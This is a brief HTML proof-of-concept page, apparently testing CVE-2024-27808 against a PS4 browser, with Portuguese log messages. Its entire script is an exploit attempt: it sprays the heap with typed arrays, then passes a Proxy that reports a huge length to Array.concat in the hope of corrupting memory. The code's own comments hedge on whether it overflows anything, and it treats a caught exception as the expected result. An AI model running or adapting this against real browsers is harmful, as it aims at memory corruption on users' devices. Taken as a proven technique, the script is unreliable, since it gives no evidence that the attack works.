<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>PoC - CVE-2024-27808 - Refined TypedArray Attack</title>
</head>
<body>
<h1>PoC - CVE-2024-27808 - PS4 Refined Test</h1>

<script>
try {
    console.log("[+] Preparando spray de arrays...");

    let arrays = [];
    for (let i = 0; i < 10000; i++) {
        arrays.push(new Uint32Array(100));
    }

    console.log("[+] Criando objeto malicioso...");

    let handler = {
        get: function(target, prop, receiver) {
            if (prop === 'length') {
                return 0x10000000; // Tamanho absurdamente grande
            }
            return Reflect.get(...arguments);
        }
    };

    let proxy = new Proxy([], handler);

    console.log("[+] Tentando concatenar proxy corrompido...");

    let corrupted = [].concat(proxy); // Deveria estourar ou corromper heap

    console.log("[!] Resultado:", corrupted.length);

} catch (e) {
    console.error("[OK] Exceção capturada como esperado:", e);
}
</script>

</body>
</html>
